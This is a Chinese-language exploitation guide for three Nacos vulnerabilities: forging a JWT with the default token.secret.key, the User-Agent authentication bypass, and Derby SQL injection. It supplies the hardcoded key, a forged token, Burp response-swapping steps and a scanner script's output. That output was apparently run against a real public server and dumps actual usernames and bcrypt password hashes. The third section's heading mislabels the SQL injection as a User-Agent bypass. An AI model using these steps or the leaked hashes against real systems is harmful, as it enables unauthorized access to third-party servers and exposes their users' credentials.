## 1、token.secret.key 默认配置漏洞
### **漏洞描述**
漏洞原理为开源服务管理平台 Nacos 在默认配置下未对 token.secret.key 进行修改，导致远程攻击者可以绕过密钥认证进入后台造成系统受控等后果。
### **漏洞信息**
```
漏洞类型：身份认证绕过
漏洞等级：高危
漏洞编号：QVD-2023-6271
受影响版本：0.1.0 <= Nacos <= 2.2.0
```
### **网络测绘**
```
app="NACOS"

测试用例(源自FOFA搜索结果): http://47.100.218.188:9000
```
### **漏洞检测**
```shell
python nacos.py -m 3 -u http://47.100.218.188:9000

# 输出结果
http://47.100.218.188:9000 存在secret.key默认配置漏洞：{'accessToken': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6NDA4MTkwNzk5M30.BdQSxmoftt9zePaqO1-B9QFSi1tsiiQ2mzKUjnZfQJk', 'tokenTtl': 18000, 'globalAdmin': True, 'username': 'nacos'}
```
### **漏洞复现**
在nacos中token.secret.key值是固定死(<=2.2.0)的，位置在conf下的application.properties中:
```
nacos.core.auth.plugin.nacos.token.secret.key=SecretKey012345678901234567890123456789012345678901234567890123456789
```
利用该默认key可进行jwt构造，从而直接进入后台，构造方法：
```json
{
  "sub": "nacos",
  "exp": 1715069648
}
```
1715069648这个值是unix时间戳，要比系统当前的时间更晚，比如当前的时间是2025年05月07日16:14:08，在这里面的时间戳时间就改为05月08日.
![图片1.png](https://cdn.nlark.com/yuque/0/2024/png/25524100/1715238738175-2e9f32a3-4b9b-4b04-8cb6-1b09d79f6403.png#averageHue=%23faf8f7&clientId=u17f8cfe7-f0c6-4&from=drop&id=u60d42032&originHeight=130&originWidth=632&originalType=binary&ratio=1&rotation=0&showTitle=false&size=10144&status=done&style=none&taskId=u306d3c71-6e8b-4f23-9e3e-c0d86e0190b&title=)
注意勾选jwt.io中的secret base64 encoded，并填写上述默认secret.key
![图片1.png](https://cdn.nlark.com/yuque/0/2024/png/25524100/1715238716836-19f1d661-482b-425c-8d40-88e868e528e7.png#averageHue=%23fcfcfc&clientId=u17f8cfe7-f0c6-4&from=drop&id=uefe375bd&originHeight=625&originWidth=1197&originalType=binary&ratio=1&rotation=0&showTitle=false&size=41962&status=done&style=none&taskId=u4ee95c69-c41c-4902-8123-93dca11b690&title=)
复制加密的jwt
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTcxNTE1NjA0OH0.RS63Tvlj9ZCWvXzo-gJVvT0y3RfJ2rKql89d9V4jTBI
```
在登录界面填写账号密码（均为nacos，其他随机账号密码也可），利用burp对登录请求进行抓包，并发送到重发器
![图片1.png](https://cdn.nlark.com/yuque/0/2024/png/25524100/1715239018684-f9e44972-59eb-4af5-8266-bd3594005c75.png#averageHue=%23dbcbae&clientId=u17f8cfe7-f0c6-4&from=drop&height=931&id=ufd42ecfd&originHeight=931&originWidth=1689&originalType=binary&ratio=1&rotation=0&showTitle=false&size=6301022&status=done&style=none&taskId=ufb516b6c-1693-4894-a310-0a157e502b5&title=&width=1689)
![图片1.png](https://cdn.nlark.com/yuque/0/2024/png/25524100/1715239030691-ca23dfaf-a5a8-48fc-bdfc-4dc62bd3fcb7.png#averageHue=%23fafaf9&clientId=u17f8cfe7-f0c6-4&from=drop&height=944&id=u0264c8f2&originHeight=944&originWidth=1489&originalType=binary&ratio=1&rotation=0&showTitle=false&size=85752&status=done&style=none&taskId=u49fea553-09a2-4bd9-b09e-6216cd2d699&title=&width=1489)
添加Authorization值(上述加密的jwt), 然后点击发送
```
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTcxNTE1NjA0OH0.RS63Tvlj9ZCWvXzo-gJVvT0y3RfJ2rKql89d9V4jTBI
```
可以看到返回200，说明登录成功，利用这个可以绕过身份认证，进入后台。
![图片1.png](https://cdn.nlark.com/yuque/0/2024/png/25524100/1715239115886-a24dc5cd-d222-4602-ae5a-fae1898d7748.png#averageHue=%23f9f8f8&clientId=u17f8cfe7-f0c6-4&from=drop&height=944&id=ua4b2b647&originHeight=944&originWidth=1489&originalType=binary&ratio=1&rotation=0&showTitle=false&size=137379&status=done&style=none&taskId=ufe84d829-c73b-4829-9466-7e9ea6b97f2&title=&width=1489)
使用Burp拦截网站请求，并拦截返回包。
![图片1.png](https://cdn.nlark.com/yuque/0/2024/png/25524100/1715239150569-fdffc5a8-e09f-4d72-9aa2-f72f7df9d4e1.png#averageHue=%23f8f8f7&clientId=u17f8cfe7-f0c6-4&from=drop&id=u7ff3eab3&originHeight=941&originWidth=1481&originalType=binary&ratio=1&rotation=0&showTitle=false&size=5584519&status=done&style=none&taskId=ubbffa0fb-aea5-4ab4-a811-b3bb1289ad9&title=)
将登录请求返回包进行替换并放包（及替换成上述添加Authorization后的response，直接复制即可）。
![图片1.png](https://cdn.nlark.com/yuque/0/2024/png/25524100/1715239173552-7971a249-8c83-4c8b-b72f-b1a824b966a2.png#averageHue=%23faf9f9&clientId=u17f8cfe7-f0c6-4&from=drop&height=944&id=uc748505f&originHeight=944&originWidth=1489&originalType=binary&ratio=1&rotation=0&showTitle=false&size=96985&status=done&style=none&taskId=u1e72899b-d0d7-4de0-91f3-a4385c86f1e&title=&width=1489)
此时成功绕过身份认证并进入后台。
![图片1.png](https://cdn.nlark.com/yuque/0/2024/png/25524100/1715239205150-e76d2a19-132f-4feb-b02d-40aeb8dd07a3.png#averageHue=%23f9f6f6&clientId=u17f8cfe7-f0c6-4&from=drop&id=ue987fc7b&originHeight=948&originWidth=2304&originalType=binary&ratio=1&rotation=0&showTitle=false&size=304824&status=done&style=none&taskId=u17620007-ead6-469a-bdfc-60a58c80171&title=)

### **参考连接**
> 1、[https://www.cnblogs.com/spmonkey/p/17504263.html](https://www.cnblogs.com/spmonkey/p/17504263.html)
> 2、[https://github.com/Threekiii/Awesome-POC](https://github.com/Threekiii/Awesome-POC)

## 2、User-Agent 权限绕过漏洞
### **漏洞描述**
该洞发生在nacos在进行认证授权操作时，会判断请求的user-agent是否为”Nacos-Server”，如果是的话则不进行任何认证。
### **漏洞信息**
```
漏洞类型：使用欺骗进行的认证绕过
漏洞等级：高危
漏洞编号：CVE-2021-29441
受影响版本：Nacos <= 2.0.0-ALPHA.1
```
### **网络测绘**
```
app="NACOS"

测试用例(源自FOFA搜索结果): http://47.100.218.188:9000
```
### **漏洞检测**
```shell
python nacos.py -m 2 -u http://47.100.218.188:9000

# 输出结果
http://47.100.218.188:9000 存在User-Agent 权限绕过漏洞：{'totalCount': 13, 'pageNumber': 1, 'pagesAvailable': 2, 'pageItems': [{'username': 'nacos', 'password': '$2a$10$cad4yF1jvtwNsRuFkf.FQ.ocCRFAfhq8z4cb3qMSFX4If7QtqClg2'}, {'username': 'testuser2csSCAq5bTDybceTq74N6eZKkBn', 'password': '$2a$10$pl8/J67ZBSidKUfAhYPDreHpkKQo5RnKhvt/IOPW8Gr1GAFInDWOu'}, {'username': 'yanbuguohengyang226', 'password': '$2a$10$R80Sh.4gDlfwkCXMvBwi..EaOpTz/16P/kGQu9EKeT.UeYisPXbuy'}, {'username': 'hacker', 'password': '$2a$10$nbbU3.OObwRN2yesMbCepeIWOMBtQSzZNpaLeQjCl/eHtthnRdyOC'}, {'username': 'csavavdsf@d', 'password': '$2a$10$5xzELXZf9NNcUgHE4ouaNOpCh0Bea1frJGW8IU6yWlnOSGU/uTjTm'}, {'username': 'A123456', 'password': '$2a$10$UifTdakUQ2faVlfgav839OuzA26j9N3z5lXkG7CRJc0z.78diLOBe'}, {'username': 'nac0s', 'password': '$2a$10$CyFERvR.d7Ek5lL6UQcf/OPy2MPTgi4C6xLG/AzM0hWKZ2wEVR0y.'}, {'username': 'admin', 'password': '$2a$10$FTzEXoM8THygFG.EkjU9BudX6dwhNTZqBJtm6ov26dmvefUGr.r6a'}, {'username': 'nacos_ad', 'password': '$2a$10$goeZ0ZREt1GOLYu8quLyPui8vP6nrnG1sf.3z9Knhe5Fgpk8Jkbye'}, {'username': 'nezha', 'password': '$2a$10$AxIZ.CopXHOHfYHDEA4tieuLAJkRaTmX5Om.97EvtGglkohDyRvmm'}]}
```
### **参考连接**
> 1、[https://www.cnblogs.com/xyz315/p/15853268.html](https://www.cnblogs.com/xyz315/p/15853268.html)
> 2、[https://developer.aliyun.com/article/1221131](https://developer.aliyun.com/article/1221131)

## 3、User-Agent 权限绕过漏洞
### **漏洞描述**

Derby SQL注入漏洞是一个重要的安全问题，它涉及到Nacos中使用的Derby数据库存在的SQL注入风险。
### **漏洞信息**
```
漏洞类型：SQL注入
漏洞等级：高危
漏洞编号：CNVD-2020-67618
```
### **网络测绘**
```
app="NACOS"

测试用例(源自FOFA搜索结果): http://47.100.218.188:9000
```
### **漏洞检测**
```shell
python nacos.py -m 1 -u http://47.100.218.188:9000

# 输出结果
http://47.100.218.188:9000 存在Derby SQL 注入漏洞：{'code': 200, 'message': None, 'data': [{'USERNAME': 'nacos', 'PASSWORD': '$2a$10$cad4yF1jvtwNsRuFkf.FQ.ocCRFAfhq8z4cb3qMSFX4If7QtqClg2', 'ENABLED': True}, {'USERNAME': 'testuser2csSCAq5bTDybceTq74N6eZKkBn', 'PASSWORD': '$2a$10$pl8/J67ZBSidKUfAhYPDreHpkKQo5RnKhvt/IOPW8Gr1GAFInDWOu', 'ENABLED': True}, {'USERNAME': 'yanbuguohengyang226', 'PASSWORD': '$2a$10$R80Sh.4gDlfwkCXMvBwi..EaOpTz/16P/kGQu9EKeT.UeYisPXbuy', 'ENABLED': True}, {'USERNAME': 'hacker', 'PASSWORD': '$2a$10$nbbU3.OObwRN2yesMbCepeIWOMBtQSzZNpaLeQjCl/eHtthnRdyOC', 'ENABLED': True}, {'USERNAME': 'csavavdsf@d', 'PASSWORD': '$2a$10$5xzELXZf9NNcUgHE4ouaNOpCh0Bea1frJGW8IU6yWlnOSGU/uTjTm', 'ENABLED': True}, {'USERNAME': 'A123456', 'PASSWORD': '$2a$10$UifTdakUQ2faVlfgav839OuzA26j9N3z5lXkG7CRJc0z.78diLOBe', 'ENABLED': True}, {'USERNAME': 'nac0s', 'PASSWORD': '$2a$10$CyFERvR.d7Ek5lL6UQcf/OPy2MPTgi4C6xLG/AzM0hWKZ2wEVR0y.', 'ENABLED': True}, {'USERNAME': 'admin', 'PASSWORD': '$2a$10$FTzEXoM8THygFG.EkjU9BudX6dwhNTZqBJtm6ov26dmvefUGr.r6a', 'ENABLED': True}, {'USERNAME': 'nacos_ad', 'PASSWORD': '$2a$10$goeZ0ZREt1GOLYu8quLyPui8vP6nrnG1sf.3z9Knhe5Fgpk8Jkbye', 'ENABLED': True}, {'USERNAME': 'nezha', 'PASSWORD': '$2a$10$AxIZ.CopXHOHfYHDEA4tieuLAJkRaTmX5Om.97EvtGglkohDyRvmm', 'ENABLED': True}, {'USERNAME': 'test', 'PASSWORD': '$2a$10$Qb5j/mOoWxVy1xmJArVavOhcUdCtI3tGFSuSjZkJSCDcGBqWcEJCW', 'ENABLED': True}, {'USERNAME': 'ttestt', 'PASSWORD': '$2a$10$IjPVjBDyhdI8s1JqB1gHnepzcs8pDUMQrDzqT36IcxPj/NBHvpJTC', 'ENABLED': True}, {'USERNAME': 'adminsss', 'PASSWORD': '$2a$10$/5Pcwz5qWr9Lglp.vfbeKOWCc.uFWxWAMRiR/dvptt.fFiebLSA8.', 'ENABLED': True}]}
```
### **参考连接**
> 1、[https://h0ny.github.io/posts/Nacos-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/#nacos-derby-sql-%E6%B3%A8%E5%85%A5](https://h0ny.github.io/posts/Nacos-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/#nacos-derby-sql-%E6%B3%A8%E5%85%A5)

